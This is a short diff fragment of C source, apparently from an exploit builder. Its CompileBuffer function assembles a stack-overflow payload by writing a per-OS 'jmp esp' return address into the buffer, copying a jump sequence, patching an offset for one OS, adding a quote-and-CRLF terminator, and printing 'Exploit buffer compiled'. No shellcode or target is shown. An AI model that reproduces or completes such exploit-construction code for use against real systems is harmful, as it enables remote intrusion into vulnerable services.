@@ -149,3 +149,12 @@ void CompileBuffer()
 
 	*((unsigned int*)(buf0+retOffset))=osApiPtrs[osId].jmpEspPtr;
 	memcpy(buf0+jmpOffset,jmpSeq,5);
+    if(osId==0)
+	{
+		*((unsigned short*)(buf0+back3Offs))=back3;
+	}
+
+	sprintf((char*)(buf0+EXPL_SIZE-3),"\"\r\n");
+
+	printf("Exploit buffer compiled\n");
+}
